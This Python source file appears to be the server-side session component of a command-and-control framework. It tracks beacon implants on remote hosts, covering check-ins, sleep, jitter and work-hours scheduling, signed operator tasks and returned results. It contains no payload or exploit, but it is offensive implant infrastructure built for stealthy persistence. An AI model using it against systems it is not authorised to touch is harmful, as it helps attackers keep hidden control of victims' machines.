"""Server-side representation of one beacon implant.

A beacon has no persistent socket. Its entire state is derived from
incoming HTTP requests. This class captures that state and gives the
engine a place to accumulate queued work and pending results.

All reads are lock-free. Writes to the `pending` map go through
`_pending_lock`; everything else is mutated by BeaconEngine under the
engine lock.
"""

from __future__ import annotations

import queue
import threading
import time
from typing import Dict, List, Optional, Tuple

from . import constants
from .protocol import Result, Task, new_task_id


class PendingTask:
    """Blocking handle for a task that has been queued but not returned."""

    def __init__(self, task_id: str, queued_by: str = '',
                 verb: str = '', args=None, queued_at: float = 0.0):
        self.task_id = task_id
        self._event = threading.Event()
        self._result: Optional[Result] = None
        self.queued_by = queued_by or ''
        self.verb = verb or ''
        self.args = list(args or [])
        self.queued_at = float(queued_at or 0.0)

    def set(self, result: Result) -> None:
        self._result = result
        self._event.set()

    def wait(self, timeout: float) -> Optional[Result]:
        self._event.wait(timeout=timeout)
        return self._result


class BeaconSession:
    """One logical beacon session."""

    def __init__(self, session_id: int, identity: dict, fingerprint: str):
        self.id = session_id
        self.name: Optional[str] = None
        self.identity: dict = dict(identity)
        self.fingerprint = fingerprint
        self.last_addr: Optional[str] = None
        self.last_seen: float = time.time()
        self.first_seen: float = self.last_seen
        self.sleep_interval: int = constants.DEFAULT_SLEEP
        self.jitter: float = constants.DEFAULT_JITTER
        self.kill_deadline: float = 0.0
        self._confirmed_sleep: int = self.sleep_interval
        self.work_hours_start: int = 480    # 08:00
        self.work_hours_end:   int = 1140   # 19:00
        self.spawn_to: str = ''
        _ws = identity.get('work_start')
        _we = identity.get('work_end')
        if _ws is not None and _we is not None:
            try:
                _wsi = int(_ws)
                _wei = int(_we)
                if 0 <= _wsi < 1440 and 0 <= _wei < 1440:
                    self.work_hours_start = _wsi
                    self.work_hours_end   = _wei
            except (TypeError, ValueError):
                pass

        self._last_pushed_schedule = (
            self.sleep_interval,
            round(self.jitter, 4),
            self.work_hours_start,
            self.work_hours_end,
            self.spawn_to or '',
        )

        self.task_queue: queue.Queue = queue.Queue(
            maxsize=constants.TASK_QUEUE_LIMIT)
        self.pending: Dict[str, PendingTask] = {}
        self.results: List[Result] = []
        self._pending_lock = threading.Lock()
        self._recent_results: Dict[str, tuple] = {}
        self.RESULT_RETAIN_SECONDS: float = 600.0
        self.RESULT_CACHE_MAX: int = 200
        self.unread_results: queue.Queue = queue.Queue(maxsize=256)
        self.checkins: int = 0
        self.rejected_results: int = 0
        self.logger = None
        self.tags: List[str] = []
        self.cookie: Optional[str] = None
        self.agent_pubkey = None

    # ------------------------------------------------------------------
    # Session state

    @property
    def alive(self) -> bool:
        """Beacon is alive if it has checked in recently.

        A beacon whose sleep interval is N seconds is declared dead
        after BEACON_TTL_FACTOR * N seconds of silence.

        The grace window uses the *maximum* of the currently-configured
        interval and the interval the agent last confirmed it was
        using. Without this, setting `sleep 0` from the console would
        immediately drop the grace from 240s to 60s and the session
        would flash "dead" while the agent was still finishing its
        previous 60s cycle. The agent's next poll updates
        `_confirmed_sleep` and the window narrows correctly.
        """
        confirmed = getattr(self, '_confirmed_sleep', self.sleep_interval)
        effective = max(self.sleep_interval, confirmed)
        grace = max(effective * constants.BEACON_TTL_FACTOR, 60)
        return (time.time() - self.last_seen) < grace

    @property
    def display_name(self) -> str:
        if self.name:
            return self.name
        user = self.identity.get('username', '?')
        host = self.identity.get('hostname', '?')
        return f"{user}@{host}"

    @property
    def age(self) -> int:
        return int(time.time() - self.last_seen)

    # ------------------------------------------------------------------
    # Task submission

    def enqueue(self, verb: str, args: Optional[List[str]] = None,
                timeout: int = 60, sign=None,
                queued_by: str = ''
                ) -> Optional[Tuple[str, PendingTask]]:
        """Queue a task and register a result waiter.

        Returns `(task_id, waiter)`, or `None` if the queue is full.
        The waiter is returned alongside the id so the caller holds a
        reference to it before the result can arrive and pop it from
        `pending` — a fast beacon can otherwise deliver the result
        before the caller calls `session.pending.get(task_id)`.

        Never blocks — the console thread is the caller, and a
        beacon on a long sleep with a chatty operator would otherwise
        freeze the whole handler until the next check-in drained the
        backlog.

        `sign`, if provided, is called with the task's `unsigned()`
        dict before the task enters the queue. Its return value is
        stored on `task.signature`. Signing must happen before the
        queue put: once the task is visible to the listener it may
        already be on the wire.

        `queued_by` is the operator name (or a synthetic tag like
        `schedule:<id>`) attached for introspection. It is server-
        side metadata only — `Task.unsigned()` does not include it,
        so the signature the agent verifies is unchanged.
        """
        task = Task(id=new_task_id(), verb=verb,
                    args=args or [], timeout=timeout)

        try:
            task.queued_by = queued_by or ''
            task.queued_at = time.time()
        except Exception:
            pass
        if sign is not None:
            try:
                task.signature = sign(task.unsigned()) or ''
            except Exception:
                task.signature = ''

        waiter = PendingTask(
            task.id, queued_by=queued_by,
            verb=verb, args=args or [],
            queued_at=getattr(task, 'queued_at', 0.0))

        with self._pending_lock:
            self.pending[task.id] = waiter
            try:
                self.task_queue.put_nowait(task)
            except queue.Full:
                self.pending.pop(task.id, None)
                return None
        return task.id, waiter

    def pop_task(self) -> Optional[Task]:
        """Called by the listener when the beacon requests work."""
        try:
            return self.task_queue.get_nowait()
        except queue.Empty:
            return None

    def pending_count(self) -> int:
        with self._pending_lock:
            return len(self.pending)

    def list_pending(self) -> List[dict]:
        """Return a snapshot of tasks that have been queued but not
        yet returned.

        Each entry is a dict with id, verb, args, timeout,
        queued_by, and queued_at, taken from the Task objects still
        sitting on the queue. A pending waiter whose Task has
        already been popped by the beacon (running on the target)
        is listed with the metadata of the moment it was queued —
        the engine keeps the queued_by / queued_at on the waiter
        itself so the entry survives the pop.
        """
        snapshot = []
        with self._pending_lock:
            waiter_ids = list(self.pending.keys())

        try:
            live_tasks = list(self.task_queue.queue)
        except Exception:
            live_tasks = []
        for t in live_tasks:
            if t.id not in waiter_ids:
                continue
            snapshot.append({
                'id':        t.id,
                'verb':      t.verb,
                'args':      list(t.args or []),
                'timeout':   t.timeout,
                'queued_by': getattr(t, 'queued_by', '') or '',
                'queued_at': getattr(t, 'queued_at', 0.0),
                'state':     'queued',
            })

        with self._pending_lock:
            waiters = dict(self.pending)
        for wid in waiter_ids:
            if any(e['id'] == wid for e in snapshot):
                continue
            w = waiters.get(wid)
            entry = {
                'id':        wid,
                'verb':      (getattr(w, 'verb', '') or '?')
                             if w is not None else '?',
                'args':      list(getattr(w, 'args', []) or [])
                             if w is not None else [],
                'timeout':   0,
                'queued_by': (getattr(w, 'queued_by', '') or '')
                             if w is not None else '',
                'queued_at': (getattr(w, 'queued_at', 0.0) or 0.0)
                             if w is not None else 0.0,
                'state':     'in-flight',
            }
            snapshot.append(entry)
        return snapshot

    def cancel(self, task_id: str, requester: str,
               role: str = '') -> Tuple[bool, str]:
        """Remove a queued task before the beacon picks it up.

        Only the operator whose name is on the task's `queued_by`
        may cancel it. System-queued tasks — the ones the server
        itself enqueued, with an empty `queued_by` or a
        `schedule:<id>` marker — can be cancelled by an admin,
        because no human owns them.

        Returns `(ok, reason)`:

            (True,  'ok')         cancelled
            (False, 'not_found')  no pending task with this id
            (False, 'not_owner')  another operator queued it, or
                                  it is a system task and the
                                  caller is not admin
            (False, 'internal')   queue mutation failed

        The ownership check reads the waiter, not the queue, so
        it holds even after the beacon has popped the task and is
        running it on the target. Cancelling an in-flight task has
        no effect on the running process — it only prevents a
        duplicate dispatch if the beacon loses the first one.
        """
        with self._pending_lock:
            waiter = self.pending.get(task_id)
            if waiter is None:
                return False, 'not_found'
            owner = getattr(waiter, 'queued_by', '') or ''
            if not self._owns_task(owner, requester, role):
                return False, 'not_owner'

            self.pending.pop(task_id, None)

        keep = []
        try:
            while True:
                try:
                    t = self.task_queue.get_nowait()
                except queue.Empty:
                    break
                if t.id != task_id:
                    keep.append(t)
        except Exception:
            return False, 'internal'
        for t in keep:
            try:
                self.task_queue.put_nowait(t)
            except queue.Full:
                pass
        return True, 'ok'

    @staticmethod
    def _owns_task(owner: str, requester: str,
                   role: str) -> bool:
        """Authorization rule for `cancel`.

        * An operator-queued task is cancellable only by the
          operator whose name matches `owner`.
        * A system-queued task — empty owner, or the
          `schedule:<id>` marker the scheduler uses — is
          cancellable by an admin, since no operator owns it.
        * No admin override for operator-queued tasks. If you
          want one, add `or role == 'admin'` to the first
          branch below.
        """
        if owner and not owner.startswith('schedule:'):
            return owner == requester
        return role == 'admin'

    # ------------------------------------------------------------------
    # Result delivery

    def deliver_result(self, result: Result) -> None:
        """Called by the listener when the beacon posts a result."""
        with self._pending_lock:
            waiter = self.pending.pop(result.id, None)
            self.results.append(result)

            if len(self.results) > constants.TASK_HISTORY_LIMIT:
                self.results = self.results[
                    -constants.TASK_HISTORY_LIMIT // 2:
                ]

            self._recent_results[result.id] = (
                result, time.time())
            if len(self._recent_results) > self.RESULT_CACHE_MAX:
                cutoff = time.time() - self.RESULT_RETAIN_SECONDS
                stale = [
                    k for k, (_, ts) in
                    self._recent_results.items()
                    if ts < cutoff
                ]
                for k in stale:
                    self._recent_results.pop(k, None)

        if waiter is not None:
            waiter.set(result)

    def await_result(self, task_id: str,
                     timeout: float = constants.TASK_TIMEOUT) -> Optional[Result]:
        """Return the result for `task_id`, blocking up to
        `timeout` seconds.

        Two-layer lookup. First the retention cache — a result
        that has already been delivered is returned immediately.
        This is what unblocks the remote operator client: a
        sleep=0 beacon posts its result before the client's first
        poll arrives, `deliver_result` has already popped the
        waiter from `self.pending`, and without the cache this
        method would return None on every subsequent poll.

        Second, the normal blocking path: if the result has not
        been delivered yet, wait on the pending waiter. The waiter
        is set by `deliver_result` when the result arrives.

        Cache entries are popped on read, matching the single-use
        semantics the waiter path has. A second poll for the same
        task_id after the first reader consumed it returns None.
        """
        with self._pending_lock:
            entry = self._recent_results.pop(task_id, None)
        if entry is not None:
            return entry[0]

        with self._pending_lock:
            waiter = self.pending.get(task_id)
        if waiter is None:
            return None
        result = waiter.wait(timeout=timeout)
        if result is not None:
            with self._pending_lock:
                self._recent_results.pop(task_id, None)
        return result